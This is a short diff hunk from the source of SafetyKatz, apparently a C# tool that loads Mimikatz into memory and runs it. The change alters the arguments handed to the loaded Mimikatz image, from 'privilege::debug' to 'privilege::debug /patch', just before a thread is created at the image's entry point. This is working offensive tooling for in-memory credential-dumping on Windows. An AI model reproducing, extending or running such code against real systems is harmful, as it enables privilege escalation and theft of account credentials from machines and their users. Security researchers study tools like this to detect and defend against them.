@@ -225,7 +225,7 @@ namespace SafetyKatz
                 // Transfer Control To OEP
                 Console.WriteLine("\n[*] Executing loaded Mimikatz PE");
 
-                string[] fakeArgs = { "privilege::debug" };
+                string[] fakeArgs = { "privilege::debug /patch" };
                 args = fakeArgs;
                 IntPtr threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.AddressOfEntryPoint));
                 IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
